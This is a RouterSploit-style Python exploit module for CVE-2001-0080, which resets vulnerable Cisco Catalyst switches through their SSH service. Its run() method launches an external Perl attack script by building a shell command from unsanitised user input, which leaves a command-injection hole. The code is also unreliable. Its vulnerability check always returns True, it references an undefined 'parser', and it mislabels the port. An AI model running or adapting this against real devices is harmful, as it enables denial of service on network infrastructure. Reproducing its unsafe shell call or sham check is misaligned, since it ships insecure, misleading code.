



import sys,os

from routersploit.core.exploit import *

from routersploit.core.http.http_client import HTTPClient

from ctypes import *



class Exploit(HTTPClient):



    __info__ = {

        "name": "CVE-2001-0080",

        "description": "Software versions 6.1(1), 6.1(1a) and 6.1(1b) for Catalyst 4000, 5000, and 6000 devices  "
                       "that support SSH and 3 DES encryption contain a vulnerability that  "
                       "may allow an attacker to cause a denial of service. "
                       "If a connection is made to the SSH service on a vulnerable Catalyst device and  "
                       "the protocol mismatch error occurs, the device will be reset.",

        "authors": (

            "###",  # vulnerability discovery

            "###",  # routersploit module

        ),

        "references": (

            "",

        ),

        "devices": (

            "Cisco, CVE-2001-0080"
        ),
    }


    target = OptIP("", "dest_addr IPv4 or IPv6 address")
    port = OptPort(80, "Target FTP port")
    num = OptString("","vulnerability number 1-14")
    
    def run(self):

        if self.check():

            print_success("Target seems to be vulnerable")
            text = os.path.basename(__file__)
            print(text)
            path = os.path.realpath(__file__)
            path = path.replace(text,'')
            path = path.replace('\\','/')
            path1 = 'cd {}'.format(path)
            fileName = 'perl {} {} {}'.format('CVE-2001-0080.pl',self.target,self.num)
            path2 = path1 + " && " + fileName
            #print(path2)
            os.system(path2)
        else:

            parser.print_help(sys.stderr)

            print_error("Exploit failed - target seems to be not vulnerable")


    def check(self):
       
        return True